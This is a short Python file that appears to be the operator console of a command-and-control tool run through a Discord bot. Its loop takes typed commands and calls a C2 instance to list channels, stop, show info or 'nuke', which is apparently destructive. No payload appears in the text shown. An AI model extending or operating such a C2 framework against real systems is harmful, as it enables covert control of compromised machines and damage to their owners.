import asyncio
from discordc2.config import config
from discordc2.discord_bot.bot import c2_instance

async def start_cli():
    print(config.logo)
    while True:
        inp = await asyncio.get_event_loop().run_in_executor(None, input, ">")
        if inp == "help":
            print("Commands")
        elif inp == "getchannels":
            print("--------Channels--------")
            channels = await c2_instance.getAllChannels()
            for c in channels:
                print(c + "\n")
        elif inp == "stop":
            await c2_instance.stop()
        elif inp == "exit":
            break
        elif inp == "info":
            print(await c2_instance.info())
        elif inp == "nuke":
            await c2_instance.nuke()
        elif inp != "":
            print(f"Command: '{inp}' not found")
